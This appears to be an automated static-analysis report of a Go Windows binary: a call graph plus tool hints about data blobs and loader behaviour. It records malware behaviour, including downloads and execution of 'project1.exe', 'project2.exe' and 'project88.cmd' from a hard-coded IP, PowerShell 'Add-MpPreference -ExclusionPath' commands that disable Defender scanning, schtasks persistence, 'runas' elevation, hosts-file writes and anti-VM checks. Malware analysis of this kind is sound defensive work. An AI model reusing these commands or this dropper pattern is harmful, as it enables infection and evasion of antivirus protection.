@@ -1,0 +1,500 @@
+main.main
+  0x19062f0 -> os/exec.Command("cmd")
+  0x1906344 -> os/exec.(*Cmd).Run
+  0x19063b4 -> fmt.Fprintln
+  0x19063c3 -> syscall.Getwd
+  0x190640a -> fmt.Fprintln
+  0x1906418 -> io/ioutil.ReadDir
+  0x190650b -> fmt.Fprintln
+  0x1906540 -> encoding/base64.(*Encoding).EncodeToString
+  0x19065c0 -> fmt.Fprintln
+  0x1906614 -> fmt.Fprintln
+  0x190668e -> indirect_call
+  0x1906793 -> encoding/base64.(*Encoding).DecodeString
+  0x1906801 -> fmt.Fprintln
+  0x1906886 -> fmt.Fprintln
+  0x1906897 -> os.Getenv("PROGRAMDATA")
+  0x19068b5 -> io/ioutil.ReadDir
+  0x1906900 -> fmt.Fprintln
+  0x190692c -> indirect_call
+  0x1906980 -> fmt.Fprintf("Error when getting CPU name: %v\n")
+  0x19069a7 -> indirect_call
+  0x1906a15 -> fmt.Fprintf("Error while getting name your mother: %v\n")
+  0x1906aa0 -> indirect_call
+  0x1906c2a -> fmt.Sprintf("%s %s")
+  0x1906ca6 -> fmt.Fprintln
+  0x1906d09 -> fmt.Fprintf("%c ")
+  0x1906d78 -> github.com/whiterabb17/medusa/antivm.BySizeDisk
+  0x1906d86 -> os.Exit
+  0x1906d8b -> github.com/whiterabb17/medusa/antivm.IsVirtualDisk
+  0x1906d96 -> os.Exit
+  0x1906da7 -> os.Getenv("PROGRAMDATA")
+  0x1906db9 -> main.internal_cpu_cpuid
+  0x1906dc4 -> main.io_NopCloser
+  0x1906dcb -> os.Exit
+  0x1906dd0 -> main.runtime_findfunc
+  0x1906df2 -> sync.(*WaitGroup).Add
+  0x1906f2d -> sync.(*WaitGroup).Wait
+  0x1906f52 -> main.widiasd
+  0x1906f6d -> os.OpenFile("C:\\Windows\\System32\\drivers\\etc\\hosts")
+  0x1906fc0 -> fmt.Fprintln
+  0x1907026 -> os.(*File).Write
+  0x190702d -> os.Exit
+  0x19070a0 -> os/exec.Command("cmd")
+  0x19070f4 -> os/exec.(*Cmd).Run
+  0x1907162 -> fmt.Fprintln
+  0x190723a -> fmt.Fprintln
+  0x190726c -> encoding/base64.(*Encoding).EncodeToString
+  0x19072eb -> fmt.Fprintln
+  0x1907307 -> encoding/base64.(*Encoding).DecodeString
+  0x1907375 -> fmt.Fprintln
+  0x19073fa -> fmt.Fprintln
+  0x1907410 -> indirect_call -> main.main.func5
+  0x1907461 -> fmt.Fprintf("Error when getting CPU name: %v\n")
+  0x1907488 -> indirect_call
+  0x1907538 -> fmt.Sprintf("%s %s")
+  0x19075b4 -> fmt.Fprintln
+  0x190760f -> fmt.Fprintf("Error while getting name your mother: %v\n")
+  0x1907677 -> fmt.Fprintf("%c ")
+  0x19076c8 -> os.Exit
+  0x19077a6 -> github.com/therecipe/qt/internal.CallLocalFunction
+  0x19077c3 -> github.com/therecipe/qt/widgets.(*QAbstractButton).ConnectClicked
+  0x19077e4 -> indirect_call
+github.com/whiterabb17/medusa/antivm.BySizeDisk
+  0x190532f -> github.com/whiterabb17/medusa/antivm.queryWMI
+github.com/whiterabb17/medusa/antivm.queryWMI
+  0x19052e0 -> github.com/StackExchange/wmi.CreateQuery
+  0x19052f9 -> github.com/StackExchange/wmi.Query
+github.com/StackExchange/wmi.CreateQuery
+  0x701a00 -> bytes.(*Buffer).WriteString
+  0x701a78 -> reflect.Value.Elem
+  0x701aa2 -> reflect.Value.typeSlow
+  0x701ac0 -> indirect_call
+  0x701ae0 -> indirect_call
+  0x701b4e -> indirect_call
+  0x701b90 -> indirect_call
+  0x701c81 -> strings.Join
+  0x701c94 -> bytes.(*Buffer).WriteString
+  0x701cad -> bytes.(*Buffer).WriteString
+  0x701cd6 -> bytes.(*Buffer).WriteString
+  0x701cf4 -> indirect_call
+  0x701d04 -> bytes.(*Buffer).WriteString
+  0x701d40 -> bytes.(*Buffer).WriteString
+github.com/StackExchange/wmi.Query
+  0x6fe0ca -> github.com/StackExchange/wmi.(*SWbemServices).Query
+  0x6fe0ed -> github.com/StackExchange/wmi.(*Client).Query
+github.com/StackExchange/wmi.(*SWbemServices).Query
+  0x6fddc0 -> sync.(*Mutex).lockSlow
+  0x6fde31 -> sync.(*Mutex).unlockSlow
+  0x6fde49 -> fmt.Errorf("SWbemServices has been closed")
+  0x6fdf89 -> sync.(*Mutex).unlockSlow
+  0x6fdfe0 -> sync.(*Mutex).unlockSlow
+  0x6fdff8 -> fmt.Errorf("SWbemServices is not Initialized")
+github.com/StackExchange/wmi.(*Client).Query
+  0x6fe837 -> reflect.Value.Elem
+  0x6fe854 -> github.com/StackExchange/wmi.checkMultiArg
+  0x6fe8a1 -> sync.(*Mutex).lockSlow
+  0x6fe940 -> github.com/StackExchange/wmi.(*Client).coinitService
+  0x6fe9e5 -> github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs
+  0x6fea62 -> github.com/StackExchange/wmi.oleInt64("Count")
+  0x6fea97 -> github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs
+  0x6feb60 -> github.com/go-ole/go-ole.reflectQueryInterface
+  0x6fec05 -> reflect.Value.typeSlow
+  0x6fec11 -> reflect.MakeSlice
+  0x6fec46 -> reflect.Value.Set
+  0x6fec61 -> github.com/go-ole/go-ole.(*IEnumVARIANT).Next
+  0x6fecf1 -> fmt.Errorf("can't get IEnumVARIANT, enum is nil")
+  0x6fef2b -> github.com/go-ole/go-ole.(*IEnumVARIANT).Next
+  0x6fefe0 -> github.com/StackExchange/wmi.(*Client).Query.func1
+github.com/StackExchange/wmi.checkMultiArg
+  0x701720 -> reflect.Value.typeSlow
+  0x70172f -> indirect_call
+  0x701745 -> indirect_call
+  0x701776 -> indirect_call
+  0x70178c -> indirect_call
+github.com/StackExchange/wmi.(*Client).coinitService
+  0x6fe2ac -> github.com/go-ole/go-ole.coInitializeEx
+  0x6fe312 -> indirect_call -> github.com/StackExchange/wmi.(*Client).coinitService.func2
+  0x6fe340 -> github.com/go-ole/go-ole/oleutil.CreateObject("WbemScripting.SWbemLocator")
+  0x6fe3a0 -> github.com/go-ole/go-ole.queryInterface
+  0x6fe415 -> github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs
+  0x6fe48c -> indirect_call
+  0x6fe4d7 -> indirect_call
+  0x6fe522 -> indirect_call
+  0x6fe57b -> indirect_call
+  0x6fe5c6 -> indirect_call
+github.com/go-ole/go-ole.coInitializeEx
+  0x6f5660 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/StackExchange/wmi.(*Client).coinitService.func2
+  0x6fe67b -> indirect_call
+github.com/go-ole/go-ole/oleutil.CreateObject
+  0x6fdcf3 -> github.com/go-ole/go-ole.ClassIDFrom
+  0x6fdd04 -> github.com/go-ole/go-ole.CreateInstance
+github.com/go-ole/go-ole.ClassIDFrom
+  0x6fb158 -> github.com/go-ole/go-ole.CLSIDFromProgID
+  0x6fb16f -> github.com/go-ole/go-ole.CLSIDFromString
+github.com/go-ole/go-ole.CLSIDFromProgID
+  0x6f56f7 -> syscall.StringToUTF16Ptr
+  0x6f5740 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.CLSIDFromString
+  0x6f57f7 -> syscall.StringToUTF16Ptr
+  0x6f5840 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.CreateInstance
+  0x6f5964 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.queryInterface
+  0x6f96e9 -> syscall.Syscall
+github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs
+  0x6f6f10 -> github.com/go-ole/go-ole.(*IDispatch).GetSingleIDOfName
+  0x6f6f38 -> github.com/go-ole/go-ole.invoke
+  0x6f6f56 -> github.com/go-ole/go-ole.invoke
+github.com/go-ole/go-ole.(*IDispatch).GetSingleIDOfName
+  0x6f6e70 -> github.com/go-ole/go-ole.getIDsOfName
+github.com/go-ole/go-ole.getIDsOfName
+  0x6f71c0 -> syscall.StringToUTF16Ptr
+  0x6f726a -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x6f72a2 -> syscall.Syscall6
+github.com/go-ole/go-ole.invoke
+  0x6f7632 -> github.com/go-ole/go-ole.VariantInit
+  0x6f7740 -> github.com/go-ole/go-ole.SysAllocStringLen
+  0x6f7dc0 -> time.Time.Format
+  0x6f7dc5 -> github.com/go-ole/go-ole.SysAllocStringLen
+  0x6f7e30 -> github.com/go-ole/go-ole.safeArrayFromByteSlice
+  0x6f7fa0 -> time.Time.Format
+  0x6f85a0 -> github.com/go-ole/go-ole.safeArrayFromStringSlice
+  0x6f8860 -> github.com/go-ole/go-ole.VariantInit
+  0x6f88f3 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x6f8957 -> syscall.Syscall9
+  0x6f8979 -> github.com/go-ole/go-ole.(*EXCEPINFO).renderStrings
+  0x6f8986 -> github.com/go-ole/go-ole.(*EXCEPINFO).Clear
+  0x6f8ada -> github.com/go-ole/go-ole.SysFreeString
+  0x6f8b35 -> github.com/go-ole/go-ole.LpOleStrToString
+github.com/go-ole/go-ole.VariantInit
+  0x6f5a20 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.SysAllocStringLen
+  0x6f5b6e -> unicode/utf16.Encode
+  0x6f5bc0 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.safeArrayFromByteSlice
+  0x6faf80 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x6fafb1 -> github.com/go-ole/go-ole.safeArrayPutElement
+github.com/go-ole/go-ole.safeArrayPutElement
+  0x6fa2a9 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.safeArrayFromStringSlice
+  0x6fb080 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x6fb0a9 -> github.com/go-ole/go-ole.SysAllocStringLen
+  0x6fb0c0 -> github.com/go-ole/go-ole.safeArrayPutElement
+github.com/go-ole/go-ole.(*EXCEPINFO).renderStrings
+  0x6f97b2 -> github.com/go-ole/go-ole.BstrToString("<nil>")
+  0x6f9818 -> github.com/go-ole/go-ole.BstrToString("<nil>")
+  0x6f9880 -> github.com/go-ole/go-ole.BstrToString("<nil>")
+github.com/go-ole/go-ole.BstrToString
+  0x6fb325 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x6fb3a3 -> unicode/utf16.decode
+github.com/go-ole/go-ole.(*EXCEPINFO).Clear
+  0x6f9909 -> github.com/go-ole/go-ole.SysFreeString
+  0x6f9949 -> github.com/go-ole/go-ole.SysFreeString
+  0x6f9989 -> github.com/go-ole/go-ole.SysFreeString
+github.com/go-ole/go-ole.SysFreeString
+  0x6f5c40 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.LpOleStrToString
+  0x6fb283 -> unicode/utf16.decode
+github.com/StackExchange/wmi.oleInt64
+  0x701843 -> github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs
+  0x7018b2 -> indirect_call -> github.com/StackExchange/wmi.oleInt64.func1
+github.com/StackExchange/wmi.oleInt64.func1
+  0x701940 -> github.com/go-ole/go-ole.(*VARIANT).Clear
+github.com/go-ole/go-ole.(*VARIANT).Clear
+  0x6fb4ee -> github.com/go-ole/go-ole.VariantClear
+github.com/go-ole/go-ole.VariantClear
+  0x6f5ac0 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.reflectQueryInterface
+  0x6f94a0 -> reflect.Value.Elem
+  0x6f9512 -> reflect.Value.Elem
+  0x6f9598 -> reflect.Value.Addr
+  0x6f95a0 -> reflect.Value.Pointer
+  0x6f95c0 -> syscall.Syscall
+github.com/go-ole/go-ole.(*IEnumVARIANT).Next
+  0x6f8f87 -> syscall.Syscall6
+github.com/StackExchange/wmi.(*Client).Query.func1
+  0x6ff1a8 -> reflect.New
+  0x6ff1c1 -> reflect.valueInterface
+  0x6ff1d6 -> github.com/StackExchange/wmi.(*Client).loadEntity
+  0x6ff25c -> indirect_call -> github.com/StackExchange/wmi.(*Client).Query.func1.1
+  0x6ff2a0 -> reflect.Value.Elem
+  0x6ff2f5 -> reflect.Append
+  0x6ff320 -> reflect.Value.Set
+  0x6ff33b -> indirect_call
+github.com/StackExchange/wmi.(*Client).loadEntity
+  0x6ff720 -> reflect.Value.Elem
+  0x6ff770 -> reflect.Value.NumField
+  0x6ff7a1 -> reflect.Value.Field
+  0x6ff7e6 -> reflect.Value.typeSlow
+  0x6ff7f5 -> indirect_call
+  0x6ff7f7 -> reflect.New
+  0x6ff820 -> reflect.Value.Set
+  0x6ff840 -> reflect.Value.Elem
+  0x6ff8c0 -> reflect.Value.typeSlow
+  0x6ff8da -> indirect_call
+  0x6ff98c -> github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs
+  0x6ff9e0 -> reflect.Value.typeSlow
+  0x6ffb12 -> github.com/go-ole/go-ole.(*VARIANT).Value
+  0x6ffbae -> strconv.ParseUint
+  0x6ffbd7 -> reflect.Value.SetUint
+  0x6ffbf5 -> strconv.ParseInt
+  0x6ffc24 -> reflect.Value.SetInt
+  0x6ffc83 -> reflect.Value.typeSlow
+  0x6ffd0a -> strconv.Atoi
+  0x6ffdc4 -> fmt.Sprintf("%02d%02d")
+  0x6ffdf7 -> time.Parse("20060102150405.000000-0700")
+  0x6ffea0 -> reflect.Value.Set
+  0x6ffec0 -> reflect.Value.SetString
+  0x6fffcb -> reflect.Value.SetFloat
+  0x7000e0 -> reflect.Value.SetBool
+  0x700229 -> reflect.Value.SetUint
+  0x700243 -> reflect.Value.SetInt
+  0x7003c0 -> reflect.Value.SetUint
+  0x7003da -> reflect.Value.SetInt
+  0x700500 -> reflect.Value.typeSlow
+  0x700505 -> reflect.Zero
+  0x70052b -> reflect.Value.Set
+  0x700572 -> reflect.Value.typeSlow
+  0x700584 -> indirect_call -> github.com/StackExchange/wmi.(*Client).loadEntity.func1
+  0x700590 -> indirect_call
+  0x7005f4 -> github.com/go-ole/go-ole.(*SafeArrayConversion).ToValueArray
+  0x700638 -> reflect.Value.typeSlow
+  0x700657 -> reflect.MakeSlice
+  0x7006da -> github.com/go-ole/go-ole.(*SafeArrayConversion).ToValueArray
+  0x700720 -> reflect.Value.typeSlow
+  0x700740 -> reflect.MakeSlice
+  0x7007c0 -> github.com/go-ole/go-ole.(*SafeArrayConversion).ToValueArray
+  0x700804 -> reflect.Value.typeSlow
+  0x700823 -> reflect.MakeSlice
+  0x700870 -> reflect.Value.Set
+  0x700980 -> reflect.Value.typeSlow
+  0x700a86 -> reflect.Value.typeSlow
+  0x700b8c -> reflect.Value.typeSlow
+  0x700c92 -> reflect.Value.typeSlow
+  0x700d95 -> reflect.Value.typeSlow
+  0x700df2 -> fmt.Sprintf("unsupported type (%T)")
+  0x700f12 -> reflect.Value.typeSlow
+  0x700f6c -> fmt.Sprintf("unsupported slice type (%T)")
+  0x7010b5 -> reflect.Value.typeSlow
+  0x7011b5 -> reflect.Value.SetString
+  0x701224 -> reflect.Value.Index
+  0x701260 -> reflect.Value.SetUint
+  0x7012d3 -> reflect.Value.Index
+  0x7013cf -> reflect.Value.Set
+  0x701415 -> reflect.Value.SetInt
+  0x701484 -> reflect.Value.Index
+  0x701574 -> reflect.Value.Set
+github.com/go-ole/go-ole.(*VARIANT).Value
+  0x6fb5cf -> github.com/go-ole/go-ole.GetVariantDate
+  0x6fb646 -> github.com/go-ole/go-ole.BstrToString
+github.com/go-ole/go-ole.GetVariantDate
+  0x6fb861 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x6fb8a2 -> time.Date
+  0x6fb8b1 -> time.Now
+github.com/StackExchange/wmi.(*Client).loadEntity.func1
+  0x7016a0 -> github.com/go-ole/go-ole.(*VARIANT).Clear
+github.com/go-ole/go-ole.(*SafeArrayConversion).ToValueArray
+  0x6fa4c4 -> github.com/go-ole/go-ole.(*SafeArrayConversion).TotalElements
+  0x6fa4f8 -> github.com/go-ole/go-ole.safeArrayGetVartype
+  0x6fa565 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x6fa605 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x6fa6a2 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x6fa742 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x6fa7c0 -> github.com/go-ole/go-ole.safeArrayGetElementString
+  0x6fa848 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x6fa8da -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x6fa8e4 -> github.com/go-ole/go-ole.(*VARIANT).Value
+  0x6fa921 -> github.com/go-ole/go-ole.VariantClear
+  0x6fa971 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x6faa03 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x6faa92 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x6fab2e -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x6fabc6 -> github.com/go-ole/go-ole.safeArrayGetElement
+  0x6fac62 -> github.com/go-ole/go-ole.safeArrayGetElement
+github.com/go-ole/go-ole.(*SafeArrayConversion).TotalElements
+  0x6fae67 -> github.com/go-ole/go-ole.safeArrayGetLBound
+  0x6fae81 -> github.com/go-ole/go-ole.safeArrayGetUBound
+github.com/go-ole/go-ole.safeArrayGetLBound
+  0x6f9ff9 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.safeArrayGetUBound
+  0x6fa0d9 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.safeArrayGetVartype
+  0x6fa1ab -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.safeArrayGetElement
+  0x6f9da6 -> golang.org/x/sys/windows.(*LazyProc).Call
+github.com/go-ole/go-ole.safeArrayGetElementString
+  0x6f9ec3 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x6f9f0c -> github.com/go-ole/go-ole.BstrToString
+  0x6f9f26 -> github.com/go-ole/go-ole.SysFreeString
+github.com/StackExchange/wmi.(*Client).Query.func1.1
+  0x6ff400 -> github.com/go-ole/go-ole.(*IUnknown).Release
+github.com/go-ole/go-ole.(*IUnknown).Release
+  0x6f93c9 -> syscall.Syscall
+github.com/whiterabb17/medusa/antivm.IsVirtualDisk
+  0x190538e -> github.com/whiterabb17/medusa/antivm.queryWMI
+  0x19053b4 -> github.com/whiterabb17/medusa/utils.ContainsInList
+github.com/whiterabb17/medusa/utils.ContainsInList
+  0x1905234 -> strings.ToLower
+  0x1905243 -> strings.Index
+main.internal_cpu_cpuid
+  0x1906203 -> fmt.Fprintln
+  0x1906228 -> os.OpenFile("\\\\.\\PHYSICALDRIVE0")
+main.io_NopCloser
+  0x1905f7a -> os.Executable
+  0x1905f8a -> syscall.Getwd
+  0x1905fe7 -> strings.Join
+  0x1906002 -> syscall.UTF16FromString("runas")
+  0x1906028 -> syscall.UTF16FromString
+  0x190604e -> syscall.UTF16FromString
+  0x1906078 -> syscall.UTF16FromString
+  0x19060a8 -> golang.org/x/sys/windows.ShellExecute
+  0x19060e6 -> fmt.Fprintln
+main.runtime_findfunc
+  0x1905b49 -> os.Getenv("APPDATA")
+  0x1905b67 -> os.Getenv("PROGRAMDATA")
+  0x1905c53 -> fmt.Fprintln
+  0x1905cc2 -> fmt.Sprintf("Add-MpPreference -ExclusionPath \"%s\"")
+  0x1905d22 -> fmt.Sprintf("Add-MpPreference -ExclusionPath \"%s\"")
+  0x1905de2 -> os/exec.Command("powershell")
+  0x1905e2e -> os/exec.(*Cmd).Run
+  0x1905ee1 -> os/exec.Command("powershell")
+  0x1905f2d -> os/exec.(*Cmd).Run
+  0x1905f37 -> time.Sleep
+main.main.func1
+  0x1907a60 -> main.runtime_moveTimers("http://79.137.207.129:25565/project1.exe")
+  0x1907a9a -> main.vendor_golang_org_x_sys_cpu_initOptions
+main.runtime_moveTimers
+  0x19057c0 -> fmt.Fprintln
+  0x1905805 -> os.OpenFile
+  0x1905851 -> fmt.Fprintln
+  0x19058ab -> net/http.(*Client).Get
+  0x19058f7 -> fmt.Fprintln
+  0x1905989 -> io.copyBuffer
+  0x19059d0 -> fmt.Fprintln
+  0x19059e5 -> indirect_call -> main.runtime_moveTimers.func2
+  0x19059f7 -> indirect_call
+main.runtime_moveTimers.func2
+  0x1905a83 -> indirect_call
+main.vendor_golang_org_x_sys_cpu_initOptions
+  0x19055f2 -> os/exec.Command
+  0x19055f7 -> os/exec.(*Cmd).Run
+  0x1905609 -> indirect_call -> main.vendor_golang_org_x_sys_cpu_initOptions.func1
+main.vendor_golang_org_x_sys_cpu_initOptions.func1
+  0x1905680 -> sync.(*WaitGroup).Done
+main.main.func2
+  0x19079a0 -> main.runtime_moveTimers("http://79.137.207.129:25565/project2.exe")
+  0x19079da -> main.vendor_golang_org_x_sys_cpu_initOptions
+main.main.func3
+  0x19078f7 -> main.runtime_moveTimers("http://79.137.207.129:25565/project88.cmd")
+  0x1907919 -> main.widiasd
+main.widiasd
+  0x1905560 -> os/exec.Command("schtasks")
+  0x1905565 -> os/exec.(*Cmd).Run
+main.main.func5
+  0x1907860 -> os.(*File).Close
+github.com/therecipe/qt/internal.CallLocalFunction
+  0x77e006 -> github.com/therecipe/qt/internal.convertToJson
+  0x77e00b -> encoding/json.Marshal
+  0x77e057 -> github.com/therecipe/qt/internal.httpRequest("syncCallIntoLocal")
+  0x77e075 -> encoding/json.Unmarshal
+  0x77e128 -> github.com/therecipe/qt/internal.handleCallback
+  0x77e1a6 -> github.com/therecipe/qt/internal.CallLocalFunction
+  0x77e204 -> github.com/therecipe/qt/internal.handleCallback
+  0x77e281 -> github.com/therecipe/qt/internal.CallLocalFunction
+  0x77e28c -> github.com/therecipe/qt/internal.convert
+github.com/therecipe/qt/internal.convertToJson
+  0x77d82f -> reflect.Value.MethodByName
+  0x77d840 -> reflect.Value.Call
+  0x77d860 -> reflect.valueInterface
+  0x77d96c -> reflect.Value.MethodByName
+  0x77d978 -> reflect.Value.Call
+  0x77d9a0 -> reflect.valueInterface
+  0x77dac8 -> github.com/therecipe/qt/internal.convertToJson
+  0x77db69 -> github.com/therecipe/qt/internal.convertToJson
+github.com/therecipe/qt/internal.httpRequest
+  0x77cd98 -> net/http.(*Client).Post
+  0x77cdf9 -> io.copyBuffer
+  0x77ce0f -> indirect_call
+  0x77ce6f -> indirect_call
+  0x77cef8 -> fmt.Fprintf("httpRequest error: %v -> %v\n")
+github.com/therecipe/qt/internal.handleCallback
+  0x77c84b -> encoding/json.Unmarshal
+  0x77ca35 -> github.com/therecipe/qt/internal.convert
+  0x77cb49 -> reflect.Value.typeSlow
+  0x77cb66 -> indirect_call
+  0x77cb80 -> reflect.Value.Convert
+  0x77cbf5 -> reflect.Value.Call
+  0x77cc18 -> reflect.valueInterface
+  0x77cc20 -> github.com/therecipe/qt/internal.convertToJson
+  0x77cc25 -> encoding/json.Marshal
+github.com/therecipe/qt/internal.convert
+  0x77d1f5 -> reflect.Value.Call
+  0x77d220 -> reflect.valueInterface
+  0x77d2cf -> github.com/therecipe/qt/internal.convert
+  0x77d3c2 -> github.com/therecipe/qt/internal.convert
+github.com/therecipe/qt/widgets.(*QAbstractButton).ConnectClicked
+  0xcb5bda -> github.com/therecipe/qt/internal.CallLocalAndRegisterRemoteFunction("___REMOTE_CALLBACK___")
+github.com/therecipe/qt/internal.CallLocalAndRegisterRemoteFunction
+  0x77ddea -> github.com/therecipe/qt/internal.functionName
+  0x77df2f -> github.com/therecipe/qt/internal.CallLocalFunction
+github.com/therecipe/qt/internal.functionName
+  0x77dc78 -> strings.Index(":")
+  0x77dca4 -> strings.genSplit(":")
+
+Semantic analysis
+  assessment_hints:
+    - Reachable code references suspicious high-entropy or magic-containing data blobs.
+    - Reachable functions contain byte transformation loops that may decode strings, configs, or payloads at runtime.
+    - The binary contains behavior consistent with dynamic code allocation and execution.
+  mid_function_control_transfers:
+    - github.com/StackExchange/wmi.(*Client).loadEntity:0x6ff90a call -> runtime.duffcopy+0x32c classification=go_runtime_duff_helper
+    - github.com/StackExchange/wmi.CreateQuery:0x701bb5 call -> runtime.duffcopy+0x32c classification=go_runtime_duff_helper
+    - github.com/go-ole/go-ole.BstrToString:0x6fb38a call -> runtime.duffzero+0x114 classification=go_runtime_duff_helper
+    - github.com/go-ole/go-ole.LpOleStrToString:0x6fb26a call -> runtime.duffzero+0x114 classification=go_runtime_duff_helper
+    - github.com/go-ole/go-ole.invoke:0x6f884a call -> runtime.duffzero+0x146 classification=go_runtime_duff_helper
+    - github.com/therecipe/qt/internal.convert:0x77d24a call -> runtime.duffzero+0x14b classification=go_runtime_duff_helper
+    - github.com/therecipe/qt/internal.convertToJson:0x77d4ee call -> runtime.duffzero+0x14b classification=go_runtime_duff_helper
+    - main.widiasd:0x1905475 call -> runtime.duffzero+0x139 classification=go_runtime_duff_helper
+  indirect_calls:
+    - github.com/StackExchange/wmi.(*Client).Query.func1:0x6ff25c call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).Query.func1:0x6ff33b call r9 [interface_method_or_object_dispatch] evidence=target comes from register R9; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService:0x6fe312 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService:0x6fe48c call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService:0x6fe4d7 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService:0x6fe522 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService:0x6fe57b call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService:0x6fe5c6 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService.func2:0x6fe67b call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).loadEntity:0x6ff7f5 call rcx [interface_method_or_object_dispatch] evidence=target comes from register RCX; target uses register-indirect memory addressing
+  suspicious_data_blobs:
+    - blob_0 .data:0x3441000 size=0x1000 entropy=5.907 reasons=contains_magic_bytes refs=<none>
+    - blob_1 .data:0x3449000 size=0x1000 entropy=5.986 reasons=contains_magic_bytes refs=<none>
+    - blob_2 .data:0x3450000 size=0x1000 entropy=5.268 reasons=contains_magic_bytes refs=<none>
+    - blob_3 .data:0x3453000 size=0x1000 entropy=6.454 reasons=contains_magic_bytes refs=<none>
+    - blob_4 .data:0x3457000 size=0x2000 entropy=7.994 reasons=high_entropy refs=<none>
+    - blob_5 .data:0x345d000 size=0x1000 entropy=6.033 reasons=contains_magic_bytes refs=<none>
+    - blob_6 .data:0x3470000 size=0x1000 entropy=7.899 reasons=high_entropy,contains_magic_bytes refs=<none>
+    - blob_7 .data:0x3480000 size=0x2000 entropy=7.954 reasons=high_entropy refs=<none>
+    - blob_8 .data:0x3486000 size=0x2000 entropy=6.637 reasons=contains_magic_bytes refs=<none>
+    - blob_9 .data:0x3489000 size=0x2000 entropy=6.556 reasons=contains_magic_bytes refs=<none>
+  data_transformers:
+    - main.main ops=add,base64,bytes_to_string,shift,sub,xor confidence=medium sources=blob_40
+    - github.com/StackExchange/wmi.CreateQuery ops=add,bytes_to_string,shift,sub,xor confidence=medium sources=<unknown>
+    - github.com/StackExchange/wmi.(*Client).Query ops=add,sub,xor confidence=medium sources=blob_26
+    - github.com/StackExchange/wmi.(*Client).coinitService ops=add,sub,xor confidence=medium sources=blob_26
+    - github.com/go-ole/go-ole.invoke ops=add,shift,sub,xor confidence=medium sources=<unknown>
+    - github.com/StackExchange/wmi.oleInt64 ops=add,sub,xor confidence=medium sources=blob_26
+    - github.com/go-ole/go-ole.reflectQueryInterface ops=add,sub,xor confidence=medium sources=blob_26
+    - github.com/StackExchange/wmi.(*Client).Query.func1 ops=add,sub,xor confidence=medium sources=blob_26
+    - github.com/StackExchange/wmi.(*Client).loadEntity ops=add,shift,sub,xor confidence=medium sources=blob_26
+    - github.com/go-ole/go-ole.(*SafeArrayConversion).ToValueArray ops=add,shift,sub,xor confidence=medium sources=blob_26
+  loader_behaviors:
+    - <reachable_component> kind=dynamic_code_loader confidence=high evidence=executable_memory_requested,raw_syscall
+    - github.com/go-ole/go-ole.queryInterface kind=suspicious_runtime_behavior confidence=low evidence=raw_syscall
+    - github.com/go-ole/go-ole.getIDsOfName kind=suspicious_runtime_behavior confidence=low evidence=raw_syscall
+    - github.com/go-ole/go-ole.invoke kind=dynamic_code_loader confidence=medium evidence=executable_memory_requested,raw_syscall
+    - github.com/go-ole/go-ole.reflectQueryInterface kind=dynamic_code_loader confidence=medium evidence=executable_memory_requested,raw_syscall
+    - github.com/go-ole/go-ole.(*IEnumVARIANT).Next kind=suspicious_runtime_behavior confidence=low evidence=raw_syscall
+    - github.com/go-ole/go-ole.(*IUnknown).Release kind=suspicious_runtime_behavior confidence=low evidence=raw_syscall
